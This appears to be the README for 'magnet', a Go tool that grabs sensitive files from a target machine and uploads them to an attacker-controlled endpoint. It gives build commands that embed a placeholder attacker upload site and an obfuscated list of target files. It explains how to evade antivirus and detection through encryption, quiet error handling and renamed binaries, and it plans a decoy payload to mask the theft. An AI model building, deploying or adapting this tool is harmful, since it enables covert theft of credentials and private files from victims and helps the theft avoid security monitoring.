  <strong>Grab interesting files from remote</strong><br>
  All the job is done at compilation time</pre>
</div>



## Usage

**At compilation time** you need to specify:
* ***The remote endpoint***, where juicy files are uploaded
* ***The Juicy files***, list of files you want to grab
* ***The target os***, to fit the target (between: `windows`, `darwin`, `linux`)

So the compilation line looks like this:
```shell
export FILES=$(cat samples/linux_juicy_files_obfuscated.txt)
export KEY=[YOUR_SECRET_KEY]
export ENDPOINT=http://[ATTACKER_UPLOAD_SITE]
GOOS=linux GOARCH=amd64 go build -ldflags "-X 'main.FileList=$FILES' "-X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT'" magnet.go
```

Then on target machine:
```shell
./magnet #or magnet.exe
```

### Obfuscation/Encryption

As you can see, it uses <code>linux_juicy_files_<b>obfuscated.txt</b></code>. To avoid detection system, as we are seeking for sensitive files, **the different files we want to grab must not be in clear text within the binary** . Hence it used basic basic encryption with the key to decrypt embedded in binary. *(The aim is only to avoid AV and Detection system not to have strong encryption scheme)*

To build the obfuscated list:
```shell
./list_obfuscator $KEY [FILE]
```

### Notes

* For the remote endpoint , I suggest you to use the `/push` endpoint of a [`gitar`](https://github.com/ariary/gitar) listener
* The software is built to be stealthy hence:
  * error handling is not verbose (hidden flag to get more verbosity `-thisisdebug`)
  * I suggest to overwrite usage string in `magnet.go` to fit your attack scenario
  * rename `magnet` executable

## To do

* Include a fake payload that will also be run to fake an attacking scenario (example update, etc)
* Handle directories
